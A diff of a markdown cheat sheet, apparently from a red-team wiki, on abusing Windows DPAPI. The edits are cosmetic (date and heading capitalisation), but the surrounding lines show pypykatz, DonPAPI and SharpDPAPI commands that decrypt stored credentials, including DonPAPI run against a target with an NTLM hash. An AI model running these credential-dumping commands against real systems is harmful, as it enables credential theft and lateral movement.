@@ -1,10 +1,10 @@
 ---
 title: "DPAPI"
-date: 2024-7-31
+date: 2025-7-25
 tags: ["Credential Dumping", "Mimikatz", "DPAPI", "Windows", "Password", "Donpapi"]
 ---
 
-### Abuse #1: Credentials dump (From Linux)
+### Abuse #1: Credentials Dump (From Linux)
 
 {{< tab set1 tab1  >}}pypykatz{{< /tab >}}
 {{< tab set1 tab2 >}}DonPAPI{{< /tab >}}
@@ -48,7 +48,7 @@ type C:\ProgramData\<CREDENTIALS_HASH>
 cat credential_b64 | base64 -d > credential_file
 ```
 
-#### 3. Decrypt credentials
+#### 3. Decrypt Credentials
 
 ```console
 pypykatz dpapi prekey password <SID> '<PASSWORD>' | tee pkf
@@ -66,12 +66,12 @@ pypykatz dpapi credential mkf credential_file
 {{< tabcontent set1 tab2 >}}
 
 ```console
-# With password
+# Password
 DonPAPI collect -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -t <TARGET>
 ```
 
 ```console
-# With hash
+# NTLM
 DonPAPI collect -d <DOMAIN> -u '<USER>' -H <HASH> -t <TARGET>
 ```
 
@@ -79,7 +79,7 @@ DonPAPI collect -d <DOMAIN> -u '<USER>' -H <HASH> -t <TARGET>
 
 {{< /tabcontent >}}
 
-### Abuse #1: Credentials dump (From Windows)
+### Abuse #1: Credentials Dump (From Windows)
 
 {{< tab set2 tab1  >}}mimikatz{{< /tab >}}
 {{< tab set2 tab2 >}}SharpDPAPI{{< /tab >}}
@@ -144,7 +144,7 @@ File Not Found
 
 ```
 
-#### 2. Decrypt credentials
+#### 2. Decrypt Credentials
 
 {{< tab set2-1 tab1 active >}}With Password{{< /tab >}}{{< tab set2-1 tab2 >}}Without Password{{< /tab >}}
 {{< tabcontent set2-1 tab1 >}}
@@ -664,7 +664,7 @@ sharpdpapi -- 'credentials /rpc'
 {{< tab set3 tab2 >}}Auto{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-#### 1. Prepare logindata and localstate file
+#### 1. Prepare 'logindata' and 'localstate' File
 
 ```console
 # Get Local State json file, copy and paste to local Linux
